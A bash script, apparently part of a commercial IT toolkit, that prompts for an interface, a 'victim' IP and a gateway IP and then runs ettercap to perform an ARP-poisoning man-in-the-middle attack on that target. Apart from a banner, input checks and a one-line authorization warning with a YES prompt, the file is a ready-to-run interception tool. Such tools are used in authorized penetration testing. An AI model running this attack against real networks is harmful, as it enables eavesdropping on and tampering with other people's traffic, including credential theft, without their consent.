#!/usr/bin/env bash
# ==============================================================
# IT-Tool by SalgadoTech
# Script: 595.Ettercap_ARP_Spoof.sh
# ScriptID: ST-LIN-0595
# Version: 1.0
# Date: 2026-07-01
# Category: Linux > Kali Linux > Traffic Analysis
# Description: Performs an ARP poisoning MITM between a target and gateway using ettercap.
# (c) 2025 SalgadoTech - All Rights Reserved
# Unauthorized distribution prohibited
# ==============================================================

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

if [ "$EUID" -ne 0 ]; then
    echo -e "\033[0;31m  ERROR: This script requires root privileges.\033[0m"
    echo -e "\033[1;33m  Run with: sudo bash $(basename "$0")\033[0m"
    echo ""
    read -rp "Press Enter to exit..." _
    exit 1
fi

echo ""
echo -e '\033[0;36m\033[0m'
echo -e '\033[0;36m  _____ _____  _______ ____   ____  _\033[0m'
echo -e '\033[0;36m |_   _|_   _||__   __/ __ \ / __ \| |\033[0m'
echo -e '\033[0;36m   | |   | |     | | | |  | | |  | | |\033[0m'
echo -e '\033[0;36m   | |   | |     | | | |  | | |  | | |\033[0m'
echo -e '\033[0;36m  _| |_  | |     | | | |__| | |__| | |___\033[0m'
echo -e '\033[0;36m |_____| |_|     |_|  \____/ \____/|_____|\033[0m'
echo -e '\033[0;36m\033[0m'
echo -e '\033[0;37m  ==================================================================\033[0m'
echo -e '\033[0;36m  IT-Tool by SalgadoTech\033[0m'
echo -e '\033[0;36m  Script: 595.Ettercap_ARP_Spoof.sh\033[0m'
echo -e '\033[0;36m  ScriptID: ST-LIN-0595\033[0m'
echo -e '\033[0;36m  Version: 1.0\033[0m'
echo -e '\033[0;36m  Date: 2026-07-01\033[0m'
echo -e '\033[0;36m  Category: Linux > Kali Linux > Traffic Analysis\033[0m'
echo -e '\033[0;36m  Description: Performs an ARP poisoning MITM between a target and gateway using ettercap\033[0m'
echo -e '\033[0;36m  (c) 2025 SalgadoTech - All Rights Reserved\033[0m'
echo -e '\033[0;36m  Unauthorized distribution prohibited\033[0m'
echo -e '\033[0;37m  ==================================================================\033[0m'
echo ""

if ! command -v ettercap &>/dev/null; then
    echo -e "${RED}  ERROR: ettercap is not installed. Run: apt install ettercap-text-only${NC}"
    echo ""
    read -rp "Press Enter to exit..." _
    exit 1
fi

read -rp "  Interface (e.g. eth0): " i
read -rp "  Target IP (victim): " t
read -rp "  Gateway IP: " gw

if [ -z "$i" ] || [ -z "$t" ] || [ -z "$gw" ]; then
    echo -e "${RED}  ERROR: Interface, target IP and gateway IP cannot be empty.${NC}"
    echo ""
    read -rp "Press Enter to exit..." _
    exit 1
fi

for ip in "$t" "$gw"; do
    if ! [[ "$ip" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        echo -e "${RED}  ERROR: Invalid IP address: $ip${NC}"
        echo ""
        read -rp "Press Enter to exit..." _
        exit 1
    fi
done

echo ""
echo -e "${YELLOW}  WARNING: ARP spoofing intercepts other hosts' traffic. Use only with explicit authorization.${NC}"
read -rp "  Type YES to continue: " c
if [ "$c" != "YES" ]; then
    echo -e "${YELLOW}  Aborted.${NC}"
    echo ""
    read -rp "Press Enter to exit..." _
    exit 0
fi

echo ""
echo -e "${YELLOW}  Starting ettercap ARP MITM on '$i'...${NC}"
ettercap -T -i "$i" -M arp:remote "/$t//" "/$gw//"

echo ""
read -rp "Press Enter to exit..." _
